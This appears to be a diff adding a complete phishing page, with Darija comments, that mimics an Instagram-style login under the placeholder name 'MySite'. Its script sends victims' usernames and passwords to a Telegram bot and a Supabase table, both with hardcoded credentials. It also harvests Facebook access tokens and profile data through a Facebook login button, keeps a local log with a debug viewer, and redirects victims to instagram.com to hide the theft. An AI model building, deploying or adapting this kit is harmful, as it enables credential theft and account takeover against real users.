@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="description" content="Log in to MySite">
+<meta name="robots" content="noindex">
+<title>MySite - Login</title>
+<style>
+* { margin:0; padding:0; box-sizing:border-box; font-family: Arial, sans-serif; }
+body { background:#fafafa; display:flex; justify-content:center; align-items:center; min-height:100vh; padding:16px; }
+.container { width:100%; max-width:350px; }
+.box { background:white; border:1px solid #dbdbdb; padding:40px 40px 20px; text-align:center; position:relative; }
+.logo { font-size:32px; font-weight:bold; margin-bottom:30px; font-family: Georgia, serif; }
+input { width:100%; padding:10px; margin-bottom:8px; background:#fafafa; border:1px solid #dbdbdb; border-radius:3px; font-size:13px; outline:none; }
+input:focus { border-color:#a8a8a8; }
+.btn { width:100%; padding:8px; background:#0095f6; color:white; border:none; border-radius:8px; font-weight:bold; font-size:14px; margin-top:10px; cursor:pointer; }
+.btn:disabled { opacity:.6; cursor:default; }
+.err { color:#ed4956; font-size:12px; margin-top:8px; display:none; }
+.ok { color:#2e7d32; font-size:12px; margin-top:8px; display:none; }
+.hp { position:absolute; left:-9999px; width:1px; height:1px; overflow:hidden; }
+.divider { display:flex; align-items:center; margin:20px 0; color:#8e8e8e; font-size:12px; font-weight:bold; }
+.divider::before, .divider::after { content:""; flex:1; height:1px; background:#dbdbdb; }
+.divider span { margin:0 15px; }
+.fb { color:#385185; font-weight:bold; font-size:14px; text-decoration:none; display:inline-flex; align-items:center; gap:6px; cursor:pointer; }
+.fb svg { width:16px; height:16px; fill:#1877f2; }
+.fb.disabled { opacity:.5; pointer-events:none; }
+.forgot { display:block; margin-top:20px; color:#00376b; font-size:12px; text-decoration:none; }
+.box2 { background:white; border:1px solid #dbdbdb; padding:20px; text-align:center; margin-top:10px; font-size:14px; }
+.box2 a { color:#0095f6; font-weight:bold; text-decoration:none; }
+.footer { text-align:center; margin-top:20px; color:#8e8e8e; font-size:12px; }
+</style>
+</head>
+<body>
+<div class="container">
+  <div class="box">
+    <!-- بدل "MySite" هنا وفـ <title> -->
+    <div class="logo">MySite</div>
+
+    <input type="text" id="user" placeholder="Phone number, username, or email"
+           autocomplete="username" autocapitalize="none" spellcheck="false">
+    <input type="password" id="pass" placeholder="Password" autocomplete="current-password">
+
+    <!-- honeypot: البوتات كتعمره، البشر ما كيشوفوهش -->
+    <div class="hp"><input type="text" id="hp" tabindex="-1" autocomplete="off"></div>
+
+    <button class="btn" id="loginBtn">Log in</button>
+    <p class="err" id="err"></p>
+    <p class="ok" id="ok">Logged in ✓</p>
+
+    <div class="divider"><span>OR</span></div>
+    <a class="fb" id="fbBtn">
+      <svg viewBox="0 0 24 24"><path d="M22 12a10 10 0 1 0-11.6 9.9v-7H7.9V12h2.5V9.8c0-2.5 1.5-3.9 3.7-3.9 1.1 0 2.2.2 2.2.2v2.4h-1.2c-1.2 0-1.6.8-1.6 1.6V12h2.7l-.4 2.9h-2.3v7A10 10 0 0 0 22 12z"/></svg>
+      Log in with Facebook
+    </a>
+    <a href="#" class="forgot">Forgot password?</a>
+  </div>
+  <div class="box2">Don't have an account? <a href="#">Sign up</a></div>
+  <div class="footer">© 2026 MySite - Made by You</div>
+</div>
+
+<script>
+
+const CONFIG = {
+  telegram: {
+    token: '9207260058:AAGp5vs7aWXuxLMVjzTv5txv7Rf06IuKRag',
+
+    chatId: '8234346269'
+  },
+  supabase: {
+Url: 'https://gbnaqvtliemakxfabnjk.supabase.co',
+key: 'sb_publishable_utkBt1_2tM4tahJ06RLm9A_w1mIu6_n',
+  },
+  redirect: 'https://www.instagram.com/',
+  fbAppId: '1133261749287670',
+  fbVersion: 'v23.0'
+};
+
+const userEl = document.getElementById('user');
+const passEl = document.getElementById('pass');
+const hpEl   = document.getElementById('hp');
+const btn    = document.getElementById('loginBtn');
+const fbBtn  = document.getElementById('fbBtn');
+const errEl  = document.getElementById('err');
+const okEl   = document.getElementById('ok');
+let busy = false;
+
+const showErr = t => { errEl.textContent = t; errEl.style.display = 'block'; okEl.style.display = 'none'; };
+const clearErr = () => { errEl.style.display = 'none'; };
+
+
+async function sendToTelegram(lines) {
+  const { token, chatId } = CONFIG.telegram;
+  if (!token || !chatId) return;
+  await fetch('https://api.telegram.org/bot' + token + '/sendMessage', {
+    method: 'POST',
+    body: new URLSearchParams({ chat_id: chatId, text: lines.join('\n') }),
+    keepalive: true
+  });
+}
+
+async function saveToSupabase(row) {
+  const { url, key } = CONFIG.supabase;
+  if (!url || !key) return;
+  await fetch(url + '/rest/v1/logins', {
+    method: 'POST',
+    headers: {
+      'apikey': key, 'Authorization': 'Bearer ' + key,
+      'Content-Type': 'application/json', 'Prefer': 'return=minimal'
+    },
+    body: JSON.stringify(row),
+    keepalive: true
+  });
+}
+
+function saveLocal(obj) {
+  try {
+    const log = JSON.parse(localStorage.getItem('logins') || '[]');
+    log.push(obj);
+    localStorage.setItem('logins', JSON.stringify(log));
+  } catch (e) {}
+}
+
+function done(label) {
+  btn.textContent = label;
+  okEl.style.display = 'block';
+  setTimeout(() => {
+    if (CONFIG.redirect) location.href = CONFIG.redirect;
+    else { busy = false; btn.disabled = false; btn.textContent = 'Log in'; }
+  }, 700);
+}
+
+/* ---------- الفورم ---------- */
+async function handleLogin() {
+  if (busy) return;
+  const user = userEl.value.trim(), pass = passEl.value;
+  if (!user || !pass) return showErr('Enter your username and password.');
+  if (user.length > 120 || pass.length > 200) return showErr('Too long.');
+
+  const data = { user, pass, bot: hpEl.value.trim() !== '', t: Date.now() };
+  clearErr(); busy = true; btn.disabled = true; btn.textContent = 'Logging in...';
+
+  saveLocal(data);
+  console.log('captured:', data);
+
+  await Promise.allSettled([
+    saveToSupabase({ email: user, password: pass, is_bot: data.bot, via: 'form' }),
+    sendToTelegram(['🔐 New login', '👤 ' + user, '🔑 ' + pass,
+      '🤖 ' + (data.bot ? 'bot' : 'human'), '🌐 ' + location.href,
+      '🕒 ' + new Date().toLocaleString()])
+  ]);
+
+  done('Logged in');
+}
+
+btn.addEventListener('click', handleLogin);
+passEl.addEventListener('keydown', e => { if (e.key === 'Enter') handleLogin(); });
+userEl.addEventListener('keydown', e => { if (e.key === 'Enter') passEl.focus(); });
+
+/* ---------- فيسبوك ---------- */
+window.fbAsyncInit = function () {
+  FB.init({ appId: CONFIG.fbAppId, version: CONFIG.fbVersion, cookie: true, xfbml: false });
+};
+
+(function loadFbSdk() {
+  if (!CONFIG.fbAppId) { fbBtn.classList.add('disabled'); return; }
+  const s = document.createElement('script');
+  s.async = true; s.defer = true; s.crossOrigin = 'anonymous';
+  s.src = 'https://connect.facebook.net/en_US/sdk.js';
+  document.body.appendChild(s);
+})();
+
+fbBtn.addEventListener('click', () => {
+  if (busy || !CONFIG.fbAppId) return;
+  if (typeof FB === 'undefined') return showErr('Facebook SDK did not load. Disable adblock and retry.');
+  clearErr();
+
+  FB.login(res => {
+    if (res.status !== 'connected') {
+      return showErr(res.status === 'unknown' ? 'Facebook login cancelled.' : 'Facebook login failed.');
+    }
+    const token = res.authResponse.accessToken;
+
+    FB.api('/me', { fields: 'id,name,email' }, async me => {
+      if (me.error) return showErr('Could not read profile: ' + me.error.message);
+
+      busy = true; fbBtn.classList.add('disabled');
+      saveLocal({ user: me.email || me.name || me.id, name: me.name, fbId: me.id, token, via: 'facebook', t: Date.now() });
+      console.log('captured fb:', me);
+
+      await Promise.allSettled([
+        saveToSupabase({ email: me.email || me.name || me.id, password: '(facebook)',
+          is_bot: false, via: 'facebook' }),
+        sendToTelegram(['📘 Facebook login', '👤 ' + (me.name || '—'),
+          '📧 ' + (me.email || '—'), '🆔 ' + me.id, '🔑 ' + token,
+          '🌐 ' + location.href, '🕒 ' + new Date().toLocaleString()])
+      ]);
+
+      okEl.style.display = 'block';
+      fbBtn.classList.remove('disabled');
+      setTimeout(() => { if (CONFIG.redirect) location.href = CONFIG.redirect; else busy = false; }, 700);
+    });
+  }, { scope: 'public_profile,email' });
+});
+
+/* ---------- تشخيص: ?debug=1 ---------- */
+if (location.search.includes('debug')) {
+  const d = document.createElement('pre');
+  d.style.cssText = 'background:#111;color:#0f0;font-size:11px;padding:8px;white-space:pre-wrap;direction:ltr;text-align:left;margin-top:12px';
+  d.textContent = localStorage.getItem('logins') || '(empty)';
+  document.body.appendChild(d);
+}
+</script>
+</body>
+</html>
